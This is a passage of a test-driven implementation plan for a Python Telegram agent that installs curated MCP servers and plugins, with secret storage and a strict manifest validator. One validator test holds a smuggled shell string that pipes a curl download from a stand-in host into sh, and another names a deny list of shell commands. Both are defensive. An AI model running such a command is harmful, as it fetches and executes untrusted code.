# Extensions: MCP Servers and Plugins from Chat — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Let the owner install a curated MCP server or Claude Code plugin from a Telegram message and use its tools in the next message, without touching the host or restarting the container.

**Architecture:** A curated catalog of YAML manifests lives in the repo (`catalog/`) and is the *only* source of truth for what may run. A SQLite table records only the *fact* of installation. A composer merges catalog + registry + secrets into the `mcp_servers` / `plugins` structures the Claude Agent SDK already understands, and a new `base_options` builder holds the invariants the four agentic call sites share. Secrets never pass through the model: `/secret NAME=value` is intercepted in the gateway.

**Tech Stack:** Python 3.12, `claude-agent-sdk` (`ClaudeAgentOptions`, `ClaudeSDKClient`, `create_sdk_mcp_server`), aiosqlite, PyYAML, aiogram, pytest + pytest-asyncio (`asyncio_mode = "auto"` — test functions are plain `async def`, no decorator).

**Spec:** `docs/superpowers/specs/2026-07-14-extensions-mcp-plugins-design.md`

## Global Constraints

- **Catalog-only.** No code path may build an MCP server spec or a git URL from user/model input. The spec comes from a manifest in `catalog/`, keyed by name. The registry has **no** `spec_json` column — that absence is the enforcement mechanism, not an oversight.
- **stdio allowlist.** A manifest's `command` must be one of `npx`, `uvx`, `python`. `args` is always a list, never a shell string. No pipes, no `&&`, no substitution.
- **`https://` only** for `http` / `sse` transports.
- **Unknown top-level keys in a manifest are a validation error**, not a warning.
- **Secrets live in `CH_HOME/secrets.env`, mode `0600`**, never in `.env` (which is on the host and read by docker-compose only at container start). A secret must never reach `runner.run_turn`, `messages_fts`, or the SDK transcript.
- **Extension scope is `turn` and `cron` only.** `review`, `curator`, `titler` never see external servers or plugins (PRD P2 — every always-on tool schema is billed on every API call).
- **`base_options` covers four call sites, not five.** The titler is a deliberate exception (`tools=[]`, `setting_sources=[]`, no `cwd`, bare-string system prompt — each load-bearing). `env` is **not** an invariant: the foreground turn keeps the advisor, background forks pass `NO_ADVISOR_ENV`.
- **Installing resets the lane.** Tool schemas are part of the cached prefix (PRD P1). `add` / `enable` / `disable` / `remove` reset the current thread's session and say so.
- **The registry does not lie.** Every row is either a working extension or one carrying an honest `last_error`. No half-states.
- **Owner only.** `ext_manage` mutations and `/secret` require the owner, not merely an allowlisted user.
- Run tests with `.venv/Scripts/python -m pytest` (Windows dev host). Commit after every task.

---

### Task 1: `base_options` — the unified builder

Pure refactor. No behavior change; the existing suite must pass untouched.

**Files:**
- Create: `src/claude_hermes/options.py`
- Modify: `src/claude_hermes/runner.py:127-138`, `src/claude_hermes/cron/executor.py:27-38`, `src/claude_hermes/learning/review.py:68-86`, `src/claude_hermes/learning/curator.py:143-156`, `src/claude_hermes/gateway/titles.py:74-91` (comment only)
- Test: `tests/test_options.py`

**Interfaces:**
- Consumes: nothing.
- Produces: `base_options(home: Path, **overrides) -> ClaudeAgentOptions`.

- [ ] **Step 1: Write the failing test**

`tests/test_options.py`:

```python
from pathlib import Path

from claude_hermes.options import base_options


def test_base_options_sets_the_three_invariants(tmp_path):
    o = base_options(tmp_path)
    assert o.cwd == str(tmp_path / "agent_home")
    assert o.setting_sources == ["project"]
    assert o.permission_mode == "bypassPermissions"


def test_overrides_win_over_defaults(tmp_path):
    o = base_options(tmp_path, permission_mode="plan", model="claude-haiku-4-5-20251001")
    assert o.permission_mode == "plan"
    assert o.model == "claude-haiku-4-5-20251001"
    assert o.cwd == str(tmp_path / "agent_home")   # untouched defaults survive


def test_env_is_not_an_invariant(tmp_path):
    """The foreground turn keeps the advisor; background forks disable it. The builder
    must not decide that for them."""
    assert base_options(tmp_path).env == {}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/python -m pytest tests/test_options.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'claude_hermes.options'`

- [ ] **Step 3: Write the implementation**

`src/claude_hermes/options.py`:

```python
from __future__ import annotations

from pathlib import Path

from claude_agent_sdk import ClaudeAgentOptions


def base_options(home: Path, **overrides) -> ClaudeAgentOptions:
    """The invariants every agentic call site shares — and nothing else.

    Only three things must be identical across the turn, cron, review and curator
    forks: they all run in agent_home, they all load the project settings there
    (CLAUDE.md, .claude/settings.json, .claude/agents, .claude/skills), and they
    all bypass permission prompts because the container is the sandbox. Those three
    were restated by hand at four call sites and could drift apart silently.

    Everything else is legitimately per-call-site and stays where it is read:
    `tools`/`allowed_tools` (each fork wants a different reach), `hooks`, `resume`,
    `max_turns`, `mcp_servers`, `plugins`, and `env` — the foreground turn keeps the
    advisor tool while the background forks pass NO_ADVISOR_ENV (see config.py).

    The titler (gateway/titles.py) is deliberately NOT built through here: it runs
    with setting_sources=[] and no cwd on purpose, so it would override all three
    invariants. That is not reuse.
    """
    defaults: dict = {
        "cwd": str(home / "agent_home"),
        "setting_sources": ["project"],
        "permission_mode": "bypassPermissions",
    }
    defaults.update(overrides)
    return ClaudeAgentOptions(**defaults)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/Scripts/python -m pytest tests/test_options.py -v`
Expected: 3 passed

- [ ] **Step 5: Switch `runner.py` to the builder**

In `src/claude_hermes/runner.py`, replace the import block addition and the options construction.

Add to the imports (after `from .memory import MemoryStore`):

```python
from .options import base_options
```

Replace lines 127-138 (`options = ClaudeAgentOptions(...)`) with:

```python
        options = base_options(
            self._home,
            model=self._cfg.model,
            max_turns=self._cfg.max_turns,
            system_prompt={"type": "preset", "preset": "claude_code", "append": append},
            allowed_tools=_BUILTIN_TOOLS + mcp_tool_names,
            mcp_servers={"hermes": server},
            hooks={"PreToolUse": [HookMatcher(matcher="Bash", hooks=[bash_guard])]},
            resume=resume_id,
        )
```

Then drop `ClaudeAgentOptions` from the `claude_agent_sdk` import list in that file (it is no longer referenced).

- [ ] **Step 6: Switch `cron/executor.py` to the builder**

In `src/claude_hermes/cron/executor.py`, add `from ..options import base_options` after the `..guard` import, drop `ClaudeAgentOptions` from the SDK import, and replace lines 27-38 with:

```python
    options = base_options(
        home,
        model=cfg.cron_model or cfg.model,
        max_turns=cfg.max_turns,
        system_prompt={"type": "preset", "preset": "claude_code",
                       "append": f"{CRON_APPEND}\n\nToday's date: {now.date().isoformat()}"},
        allowed_tools=_TOOLS,
        hooks={"PreToolUse": [HookMatcher(matcher="Bash", hooks=[bash_guard])]},
        env=NO_ADVISOR_ENV,
    )
```

- [ ] **Step 7: Switch `learning/review.py` to the builder**

In `src/claude_hermes/learning/review.py`, add `from ..options import base_options`, drop `ClaudeAgentOptions` from the SDK import, and replace the options construction with:

```python
    options = base_options(
        home,
        model=cfg.review_model or cfg.model,
        max_turns=cfg.review_max_turns,
        system_prompt={"type": "preset", "preset": "claude_code",
                       "append": row["system_append"]},
        tools=REVIEW_BUILTIN_TOOLS,
        allowed_tools=REVIEW_TOOLS,
        mcp_servers={"hermes": server},
        hooks={"PreToolUse": [HookMatcher(
            matcher="Write|Edit",
            hooks=[skills_write_guard_factory(skills_dir, touched)],
        )]},
        resume=row["sdk_session_id"],
        fork_session=True,
        env=NO_ADVISOR_ENV,
    )
```

- [ ] **Step 8: Switch `learning/curator.py` to the builder**

In `src/claude_hermes/learning/curator.py`, add `from ..options import base_options`, drop `ClaudeAgentOptions` from the SDK import, and replace the options construction with:

```python
    options = base_options(
        home,
        model=cfg.curator_model or cfg.review_model or cfg.model,
        max_turns=cfg.curator_max_turns,
        tools=CONSOLIDATION_TOOLS,
        allowed_tools=CONSOLIDATION_TOOLS,
        hooks={"PreToolUse": [HookMatcher(
            matcher="Write|Edit",
            hooks=[skills_write_guard_factory(skills_dir)],
        )]},
        env=NO_ADVISOR_ENV,
    )
```

- [ ] **Step 9: Document why the titler is the exception**

In `src/claude_hermes/gateway/titles.py`, immediately above `options = ClaudeAgentOptions(` in `_title()`, add:

```python
        # Hand-built on purpose — NOT via options.base_options(). The builder's three
        # invariants (cwd=agent_home, setting_sources=["project"], bypassPermissions)
        # are all wrong here: this is a one-shot namer, not an agent. Routing it through
        # the builder would mean overriding every default, which is not reuse.
```

- [ ] **Step 10: Run the whole suite**

Run: `.venv/Scripts/python -m pytest -q`
Expected: all pass, unchanged. This is a pure refactor — a single failure means the builder changed behavior somewhere.

- [ ] **Step 11: Commit**

```bash
git add src/claude_hermes/options.py src/claude_hermes/runner.py src/claude_hermes/cron/executor.py src/claude_hermes/learning/review.py src/claude_hermes/learning/curator.py src/claude_hermes/gateway/titles.py tests/test_options.py
git commit -m "refactor(options): one builder for the four agentic call sites"
```

---

### Task 2: `secrets.py` — the secret store

**Files:**
- Create: `src/claude_hermes/extensions/__init__.py`, `src/claude_hermes/extensions/secrets.py`
- Test: `tests/test_secrets.py`

**Interfaces:**
- Consumes: nothing.
- Produces:
  - `secrets_path(home: Path) -> Path`
  - `load(home: Path) -> dict[str, str]`
  - `put(home: Path, name: str, value: str) -> None` — raises `SecretNameError`
  - `interpolate(text: str, secrets: Mapping[str, str]) -> str`
  - `missing(names: Iterable[str], secrets: Mapping[str, str]) -> list[str]`
  - `class SecretNameError(ValueError)`

- [ ] **Step 1: Write the failing test**

`tests/test_secrets.py`:

```python
import pytest

from claude_hermes.extensions import secrets


def test_put_then_load_roundtrip(tmp_path):
    secrets.put(tmp_path, "EXAMPLE_API_KEY", "abc123")
    assert secrets.load(tmp_path) == {"EXAMPLE_API_KEY": "abc123"}


def test_put_overwrites_and_keeps_the_others(tmp_path):
    secrets.put(tmp_path, "A_KEY", "one")
    secrets.put(tmp_path, "B_KEY", "two")
    secrets.put(tmp_path, "A_KEY", "three")
    assert secrets.load(tmp_path) == {"A_KEY": "three", "B_KEY": "two"}


def test_load_of_a_missing_file_is_empty(tmp_path):
    assert secrets.load(tmp_path) == {}


def test_values_may_contain_equals_signs(tmp_path):
    secrets.put(tmp_path, "TOKEN", "a=b=c")
    assert secrets.load(tmp_path)["TOKEN"] == "a=b=c"


def test_blank_lines_and_comments_are_skipped(tmp_path):
    secrets.secrets_path(tmp_path).write_text(
        "# a comment\n\nREAL_KEY=v\n", encoding="utf-8"
    )
    assert secrets.load(tmp_path) == {"REAL_KEY": "v"}


@pytest.mark.parametrize("name", ["lower", "1LEADS_WITH_DIGIT", "HAS-DASH", "HAS SPACE", ""])
def test_bad_names_are_refused(tmp_path, name):
    with pytest.raises(secrets.SecretNameError):
        secrets.put(tmp_path, name, "v")


def test_newlines_in_a_value_are_refused(tmp_path):
    with pytest.raises(secrets.SecretNameError):
        secrets.put(tmp_path, "KEY", "line1\nline2")


def test_interpolate_substitutes_known_vars():
    got = secrets.interpolate("Bearer ${TOKEN}", {"TOKEN": "xyz"})
    assert got == "Bearer xyz"


def test_interpolate_leaves_unknown_vars_alone():
    """A literal placeholder is a visible failure; an empty string is a silent one."""
    assert secrets.interpolate("Bearer ${NOPE}", {}) == "Bearer ${NOPE}"


def test_missing_lists_absent_names():
    assert secrets.missing(["A", "B"], {"A": "1"}) == ["B"]
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/python -m pytest tests/test_secrets.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'claude_hermes.extensions'`

- [ ] **Step 3: Write the implementation**

`src/claude_hermes/extensions/__init__.py`: empty file.

`src/claude_hermes/extensions/secrets.py`:

```python
from __future__ import annotations

import os
import re
import stat
import tempfile
from collections.abc import Iterable, Mapping
from pathlib import Path

SECRETS_FILENAME = "secrets.env"

# The bot's own tokens live in .env on the host, which docker-compose reads via
# env_file at container start. The agent process can neither write that file nor
# make it reload, so extension secrets live here instead: on the /data volume,
# ours to write, read fresh every time a server is spawned.
_NAME_RE = re.compile(r"^[A-Z][A-Z0-9_]*$")
_VAR_RE = re.compile(r"\$\{([A-Z][A-Z0-9_]*)\}")


class SecretNameError(ValueError):
    """The name or the value would corrupt the file, or is not an env-var name."""


def secrets_path(home: Path) -> Path:
    return home / SECRETS_FILENAME


def load(home: Path) -> dict[str, str]:
    path = secrets_path(home)
    if not path.is_file():
        return {}
    out: dict[str, str] = {}
    for line in path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        name, _, value = line.partition("=")   # values may contain '='
        out[name.strip()] = value
    return out


def put(home: Path, name: str, value: str) -> None:
    """Upsert one secret. Atomic, 0600, never echoed anywhere."""
    if not _NAME_RE.match(name or ""):
        raise SecretNameError(f"not an environment variable name: {name!r}")
    if "\n" in value or "\r" in value:
        raise SecretNameError("a secret value may not contain a newline")

    current = load(home)
    current[name] = value
    body = "".join(f"{k}={v}\n" for k, v in sorted(current.items()))

    path = secrets_path(home)
    path.parent.mkdir(parents=True, exist_ok=True)
    fd, tmp = tempfile.mkstemp(dir=str(path.parent), prefix=".secrets-")
    try:
        os.write(fd, body.encode("utf-8"))
        os.fsync(fd)
    finally:
        os.close(fd)
    os.chmod(tmp, stat.S_IRUSR | stat.S_IWUSR)   # 0600 before it is visible
    os.replace(tmp, path)


def interpolate(text: str, secrets: Mapping[str, str]) -> str:
    """Expand ${VAR}. An unknown var keeps its placeholder: a server that fails to
    connect with a visible ${VAR} in its config is debuggable; one that silently got
    an empty key is not."""
    return _VAR_RE.sub(lambda m: secrets.get(m.group(1), m.group(0)), text)


def missing(names: Iterable[str], secrets: Mapping[str, str]) -> list[str]:
    return [n for n in names if n not in secrets]
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/Scripts/python -m pytest tests/test_secrets.py -v`
Expected: 12 passed

Note: the `0600` mode is not asserted in the tests — Windows does not honor POSIX modes, and a
test that passes vacuously on the dev host is worse than no test. The `os.chmod` call is what
matters in the Linux container.

- [ ] **Step 5: Commit**

```bash
git add src/claude_hermes/extensions/__init__.py src/claude_hermes/extensions/secrets.py tests/test_secrets.py
git commit -m "feat(extensions): secrets.env store, atomic and 0600"
```

---

### Task 3: `catalog.py` — manifests and the validator

The most security-relevant code in the feature: a manifest is the only thing that becomes an
executable command.

**Files:**
- Create: `src/claude_hermes/extensions/catalog.py`, `catalog/mcp/filesystem.yaml`, `catalog/mcp/fetch.yaml`
- Test: `tests/test_catalog.py`

**Interfaces:**
- Consumes: nothing.
- Produces:
  - `@dataclass(frozen=True) Auth(name, prompt, url="", header="", format="")`
  - `@dataclass(frozen=True) Manifest(name, kind, label, description, version, scopes: tuple[str, ...], auth: tuple[Auth, ...], transport="", url="", command="", args: tuple[str, ...] = (), env: dict = {}, repo="", ref="")`
  - `Manifest.secret_names() -> list[str]`
  - `parse(data: dict, kind: str) -> Manifest` — raises `ManifestError`
  - `load_all(root: Path | None = None) -> dict[str, Manifest]`
  - `get(name: str, root: Path | None = None) -> Manifest | None`
  - `class ManifestError(ValueError)`
  - `STDIO_COMMANDS`, `VALID_TRANSPORTS`, `VALID_SCOPES`

- [ ] **Step 1: Write the failing test**

`tests/test_catalog.py`:

```python
import pytest
import yaml

from claude_hermes.extensions import catalog

HTTP = {
    "manifest_version": 1, "name": "example", "label": "Example",
    "description": "d", "version": "1.0.0", "transport": "http",
    "url": "https://mcp.example.com/mcp", "scopes": ["turn", "cron"],
    "auth": [{"name": "EXAMPLE_API_KEY", "prompt": "key",
              "header": "Authorization", "format": "Bearer ${EXAMPLE_API_KEY}"}],
}
STDIO = {
    "manifest_version": 1, "name": "fs", "label": "FS", "description": "d",
    "version": "1.0.0", "transport": "stdio", "command": "npx",
    "args": ["-y", "@modelcontextprotocol/server-filesystem", "/data"],
    "scopes": ["turn"],
}
PLUGIN = {
    "manifest_version": 1, "name": "p", "label": "P", "description": "d",
    "version": "1.0.0", "repo": "https://github.com/owner/repo", "ref": "v1.0.0",
    "scopes": ["turn"],
}


def test_parses_an_http_manifest():
    m = catalog.parse(HTTP, "mcp")
    assert m.name == "example" and m.transport == "http"
    assert m.secret_names() == ["EXAMPLE_API_KEY"]
    assert m.scopes == ("turn", "cron")


def test_parses_an_stdio_manifest():
    m = catalog.parse(STDIO, "mcp")
    assert m.command == "npx" and m.args[0] == "-y"


def test_parses_a_plugin_manifest():
    m = catalog.parse(PLUGIN, "plugin")
    assert m.kind == "plugin" and m.ref == "v1.0.0"


def test_rejects_an_unknown_top_level_key():
    """A typo in a security-relevant file must fail loudly, not be ignored."""
    with pytest.raises(catalog.ManifestError, match="unknown key"):
        catalog.parse({**HTTP, "commmand": "sh"}, "mcp")


def test_rejects_an_unknown_manifest_version():
    with pytest.raises(catalog.ManifestError, match="manifest_version"):
        catalog.parse({**HTTP, "manifest_version": 2}, "mcp")


def test_rejects_an_unknown_transport():
    with pytest.raises(catalog.ManifestError, match="transport"):
        catalog.parse({**HTTP, "transport": "carrier-pigeon"}, "mcp")


@pytest.mark.parametrize("command", ["bash", "sh", "curl", "/bin/sh", "node"])
def test_rejects_a_command_outside_the_allowlist(command):
    with pytest.raises(catalog.ManifestError, match="command"):
        catalog.parse({**STDIO, "command": command}, "mcp")


def test_rejects_args_given_as_a_shell_string():
    """args must be a list. A string is how a shell injection gets in."""
    with pytest.raises(catalog.ManifestError, match="args"):
        catalog.parse({**STDIO, "args": "-y pkg && curl evil.sh | sh"}, "mcp")


def test_rejects_a_non_https_url():
    with pytest.raises(catalog.ManifestError, match="https"):
        catalog.parse({**HTTP, "url": "http://mcp.example.com/mcp"}, "mcp")


def test_rejects_an_undeclared_variable():
    """Every ${VAR} used anywhere must be declared in auth, or the server would spawn
    with a literal placeholder for a credential."""
    bad = {**STDIO, "env": {"TOKEN": "${UNDECLARED_KEY}"}}
    with pytest.raises(catalog.ManifestError, match="UNDECLARED_KEY"):
        catalog.parse(bad, "mcp")


def test_rejects_an_unknown_scope():
    with pytest.raises(catalog.ManifestError, match="scope"):
        catalog.parse({**HTTP, "scopes": ["review"]}, "mcp")


def test_rejects_a_plugin_without_a_pinned_ref():
    with pytest.raises(catalog.ManifestError, match="ref"):
        catalog.parse({k: v for k, v in PLUGIN.items() if k != "ref"}, "plugin")


def test_load_all_reads_both_kinds_from_disk(tmp_path):
    (tmp_path / "mcp").mkdir()
    (tmp_path / "plugins").mkdir()
    (tmp_path / "mcp" / "example.yaml").write_text(yaml.safe_dump(HTTP), encoding="utf-8")
    (tmp_path / "plugins" / "p.yaml").write_text(yaml.safe_dump(PLUGIN), encoding="utf-8")

    entries = catalog.load_all(tmp_path)
    assert set(entries) == {"example", "p"}
    assert entries["example"].kind == "mcp"
    assert entries["p"].kind == "plugin"


def test_load_all_skips_a_broken_manifest_and_keeps_the_rest(tmp_path):
    """One bad file must not blind the agent to the whole catalog."""
    (tmp_path / "mcp").mkdir()
    (tmp_path / "mcp" / "good.yaml").write_text(yaml.safe_dump(HTTP), encoding="utf-8")
    (tmp_path / "mcp" / "broken.yaml").write_text("{{{ not yaml", encoding="utf-8")
    assert set(catalog.load_all(tmp_path)) == {"example"}


def test_the_shipped_catalog_is_valid():
    """The real catalog/ in the repo must parse. This is the regression test that a
    hand-edited manifest cannot land broken."""
    entries = catalog.load_all()
    assert "filesystem" in entries
    assert "fetch" in entries
    for m in entries.values():
        assert m.scopes and m.version
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/python -m pytest tests/test_catalog.py -v`
Expected: FAIL — `ImportError: cannot import name 'catalog'`

- [ ] **Step 3: Write the implementation**

`src/claude_hermes/extensions/catalog.py`:

```python
from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from pathlib import Path

import yaml

log = logging.getLogger(__name__)

# catalog/ sits at the repo root, three levels up from this file (src layout).
# It is read in place, never seeded into agent_home: paths._copy_missing() copies
# only when absent, so a seeded catalog would freeze at first-run and never gain
# a new entry. The catalog is code, not state.
_REPO_ROOT = Path(__file__).resolve().parents[3]
_CATALOG_DIR = _REPO_ROOT / "catalog"

MANIFEST_VERSION = 1
VALID_TRANSPORTS = frozenset({"stdio", "http", "sse"})
VALID_SCOPES = ("turn", "cron")
# An stdio server is a command executed in the agent's container. Only package
# runners that take a list of args — never a shell, which would make the args a
# script.
STDIO_COMMANDS = frozenset({"npx", "uvx", "python"})

_VAR_RE = re.compile(r"\$\{([A-Z][A-Z0-9_]*)\}")
_MCP_KEYS = {"manifest_version", "name", "label", "description", "version",
             "transport", "url", "command", "args", "env", "auth", "scopes"}
_PLUGIN_KEYS = {"manifest_version", "name", "label", "description", "version",
                "repo", "ref", "auth", "scopes"}
_AUTH_KEYS = {"name", "prompt", "url", "header", "format"}


class ManifestError(ValueError):
    """A manifest is malformed, or asks for something we refuse to run."""


@dataclass(frozen=True)
class Auth:
    name: str
    prompt: str
    url: str = ""
    header: str = ""
    format: str = ""


@dataclass(frozen=True)
class Manifest:
    name: str
    kind: str                    # 'mcp' | 'plugin'
    label: str
    description: str
    version: str
    scopes: tuple[str, ...]
    auth: tuple[Auth, ...] = ()
    transport: str = ""
    url: str = ""
    command: str = ""
    args: tuple[str, ...] = ()
    env: dict[str, str] = field(default_factory=dict)
    repo: str = ""
    ref: str = ""

    def secret_names(self) -> list[str]:
        return [a.name for a in self.auth]


def _require(data: dict, key: str, where: str) -> str:
    value = data.get(key)
    if not isinstance(value, str) or not value:
        raise ManifestError(f"{where}: '{key}' is required and must be a non-empty string")
    return value


def _parse_auth(raw, where: str) -> tuple[Auth, ...]:
    if raw is None:
        return ()
    if not isinstance(raw, list):
        raise ManifestError(f"{where}: 'auth' must be a list")
    out = []
    for item in raw:
        if not isinstance(item, dict):
            raise ManifestError(f"{where}: each 'auth' entry must be a mapping")
        unknown = set(item) - _AUTH_KEYS
        if unknown:
            raise ManifestError(f"{where}: unknown key(s) in auth: {sorted(unknown)}")
        out.append(Auth(
            name=_require(item, "name", where),
            prompt=_require(item, "prompt", where),
            url=item.get("url", ""),
            header=item.get("header", ""),
            format=item.get("format", ""),
        ))
    return tuple(out)


def _parse_scopes(raw, where: str) -> tuple[str, ...]:
    if raw is None:
        return ("turn",)
    if not isinstance(raw, list) or not raw:
        raise ManifestError(f"{where}: 'scopes' must be a non-empty list")
    for s in raw:
        if s not in VALID_SCOPES:
            raise ManifestError(
                f"{where}: unknown scope {s!r}; extensions reach the turn and cron only"
            )
    return tuple(raw)


def _check_declared_vars(m_env: dict, url: str, args: tuple, auth: tuple[Auth, ...],
                         where: str) -> None:
    declared = {a.name for a in auth}
    haystack = [url, *args, *m_env.values(), *(a.format for a in auth)]
    for text in haystack:
        for var in _VAR_RE.findall(str(text)):
            if var not in declared:
                raise ManifestError(
                    f"{where}: ${{{var}}} is used but not declared in 'auth'"
                )


def parse(data: dict, kind: str) -> Manifest:
    """Validate one manifest. Every rejection here is a rejection of something that
    would otherwise have been executed or dialled."""
    if not isinstance(data, dict):
        raise ManifestError("manifest must be a mapping")
    name = data.get("name", "<unnamed>")
    where = f"{kind}/{name}"

    if data.get("manifest_version") != MANIFEST_VERSION:
        raise ManifestError(
            f"{where}: manifest_version must be {MANIFEST_VERSION}, "
            f"got {data.get('manifest_version')!r}"
        )
    allowed = _MCP_KEYS if kind == "mcp" else _PLUGIN_KEYS
    unknown = set(data) - allowed
    if unknown:
        raise ManifestError(f"{where}: unknown key(s): {sorted(unknown)}")

    common = dict(
        name=_require(data, "name", where),
        kind=kind,
        label=_require(data, "label", where),
        description=_require(data, "description", where),
        version=_require(data, "version", where),
        scopes=_parse_scopes(data.get("scopes"), where),
        auth=_parse_auth(data.get("auth"), where),
    )

    if kind == "plugin":
        m = Manifest(
            **common,
            repo=_require(data, "repo", where),
            ref=_require(data, "ref", where),   # never float HEAD
        )
        _check_declared_vars({}, "", (), m.auth, where)
        return m

    transport = _require(data, "transport", where)
    if transport not in VALID_TRANSPORTS:
        raise ManifestError(
            f"{where}: unknown transport {transport!r}; expected one of "
            f"{sorted(VALID_TRANSPORTS)}"
        )

    if transport == "stdio":
        command = _require(data, "command", where)
        if command not in STDIO_COMMANDS:
            raise ManifestError(
                f"{where}: command {command!r} is not in the allowlist "
                f"{sorted(STDIO_COMMANDS)} — an stdio server runs in the agent's container"
            )
        args = data.get("args", [])
        if not isinstance(args, list) or any(not isinstance(a, str) for a in args):
            raise ManifestError(
                f"{where}: 'args' must be a list of strings, never a shell string"
            )
        env = data.get("env", {}) or {}
        if not isinstance(env, dict):
            raise ManifestError(f"{where}: 'env' must be a mapping")
        m = Manifest(**common, transport=transport, command=command,
                     args=tuple(args), env=dict(env))
        _check_declared_vars(m.env, "", m.args, m.auth, where)
        return m

    url = _require(data, "url", where)
    if not url.startswith("https://"):
        raise ManifestError(f"{where}: 'url' must be https, got {url!r}")
    m = Manifest(**common, transport=transport, url=url)
    _check_declared_vars({}, m.url, (), m.auth, where)
    return m


def load_all(root: Path | None = None) -> dict[str, Manifest]:
    """Every valid manifest, keyed by name. A broken file is logged and skipped —
    one bad manifest must not blind the agent to the whole catalog."""
    base = _CATALOG_DIR if root is None else root
    out: dict[str, Manifest] = {}
    for kind, subdir in (("mcp", "mcp"), ("plugin", "plugins")):
        directory = base / subdir
        if not directory.is_dir():
            continue
        for path in sorted(directory.glob("*.yaml")):
            try:
                data = yaml.safe_load(path.read_text(encoding="utf-8"))
                m = parse(data, kind)
            except (yaml.YAMLError, ManifestError):
                log.warning("skipping invalid catalog manifest %s", path, exc_info=True)
                continue
            out[m.name] = m
    return out


def get(name: str, root: Path | None = None) -> Manifest | None:
    return load_all(root).get(name)
```

- [ ] **Step 4: Write the two shipped catalog entries**

`catalog/mcp/filesystem.yaml`:

```yaml
manifest_version: 1
name: filesystem
label: Filesystem
description: >
  Read, write and search files under the agent's state directory. The official
  MCP filesystem server, scoped to /data — the same volume the agent already
  owns, so it grants no reach the Bash tool did not already have.
version: 1.0.0
transport: stdio
command: npx
args: ["-y", "@modelcontextprotocol/server-filesystem", "/data"]
scopes: [turn, cron]
```

`catalog/mcp/fetch.yaml`:

```yaml
manifest_version: 1
name: fetch
label: Fetch
description: >
  Fetch a URL and convert it to markdown for the model. The official MCP fetch
  server. Overlaps WebFetch, and is here mainly because it is a no-auth stdio
  server that proves the transport end to end.
version: 1.0.0
transport: stdio
command: uvx
args: ["mcp-server-fetch"]
scopes: [turn, cron]
```

Both are no-auth by design: they exercise the stdio path without us inventing any vendor's header
names. An entry that needs a key is added later, one at a time, with its auth shape confirmed
against that vendor's docs. The auth-bearing code path is covered by the fixture manifests in the
tests above.

- [ ] **Step 5: Run test to verify it passes**

Run: `.venv/Scripts/python -m pytest tests/test_catalog.py -v`
Expected: all pass, including `test_the_shipped_catalog_is_valid`

- [ ] **Step 6: Commit**

```bash
git add src/claude_hermes/extensions/catalog.py catalog/ tests/test_catalog.py
git commit -m "feat(extensions): curated catalog with a paranoid manifest validator"
```

---

### Task 4: the `extensions` table and its store

**Files:**
- Modify: `src/claude_hermes/db.py:7-47`
- Create: `src/claude_hermes/extensions/store.py`
- Test: `tests/test_ext_store.py`

**Interfaces:**
- Consumes: `Database` (`db.py`).
- Produces: `class ExtensionStore` with
  - `add(name, kind, catalog_version, installed_by, now) -> None`
  - `get(name) -> dict | None`
  - `list(kind: str | None = None) -> list[dict]`
  - `enabled() -> list[dict]`
  - `set_state(name, state) -> None`
  - `set_error(name, error: str | None) -> None`
  - `remove(name) -> None`

- [ ] **Step 1: Write the failing test**

`tests/test_ext_store.py`:

```python
from claude_hermes.db import Database
from claude_hermes.extensions.store import ExtensionStore

NOW = "2026-07-14T10:00:00+00:00"


async def make_store(tmp_path):
    db = await Database.open(tmp_path / "state.db")
    return db, ExtensionStore(db)


async def test_add_then_get(tmp_path):
    db, store = await make_store(tmp_path)
    await store.add("fetch", "mcp", "1.0.0", installed_by=7, now=NOW)
    row = await store.get("fetch")
    assert row["kind"] == "mcp"
    assert row["state"] == "enabled"
    assert row["installed_by"] == 7
    assert row["catalog_version"] == "1.0.0"
    assert row["last_error"] is None
    await db.close()


async def test_get_of_a_missing_name_is_none(tmp_path):
    db, store = await make_store(tmp_path)
    assert await store.get("nope") is None
    await db.close()


async def test_add_twice_upserts_rather_than_raising(tmp_path):
    """Re-adding is how a user reinstalls after a failure. It must not blow up."""
    db, store = await make_store(tmp_path)
    await store.add("fetch", "mcp", "1.0.0", installed_by=7, now=NOW)
    await store.add("fetch", "mcp", "2.0.0", installed_by=8, now=NOW)
    row = await store.get("fetch")
    assert row["catalog_version"] == "2.0.0" and row["installed_by"] == 8
    assert len(await store.list()) == 1
    await db.close()


async def test_list_filters_by_kind(tmp_path):
    db, store = await make_store(tmp_path)
    await store.add("fetch", "mcp", "1.0.0", installed_by=1, now=NOW)
    await store.add("thing", "plugin", "1.0.0", installed_by=1, now=NOW)
    assert [r["name"] for r in await store.list("plugin")] == ["thing"]
    assert len(await store.list()) == 2
    await db.close()


async def test_enabled_excludes_disabled(tmp_path):
    db, store = await make_store(tmp_path)
    await store.add("fetch", "mcp", "1.0.0", installed_by=1, now=NOW)
    await store.add("filesystem", "mcp", "1.0.0", installed_by=1, now=NOW)
    await store.set_state("fetch", "disabled")
    assert [r["name"] for r in await store.enabled()] == ["filesystem"]
    await db.close()


async def test_set_error_and_clear_it(tmp_path):
    db, store = await make_store(tmp_path)
    await store.add("fetch", "mcp", "1.0.0", installed_by=1, now=NOW)
    await store.set_error("fetch", "connection refused")
    assert (await store.get("fetch"))["last_error"] == "connection refused"
    await store.set_error("fetch", None)
    assert (await store.get("fetch"))["last_error"] is None
    await db.close()


async def test_remove(tmp_path):
    db, store = await make_store(tmp_path)
    await store.add("fetch", "mcp", "1.0.0", installed_by=1, now=NOW)
    await store.remove("fetch")
    assert await store.get("fetch") is None
    await db.close()


async def test_remove_of_a_missing_name_is_a_no_op(tmp_path):
    db, store = await make_store(tmp_path)
    await store.remove("nope")
    await db.close()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/python -m pytest tests/test_ext_store.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'claude_hermes.extensions.store'`

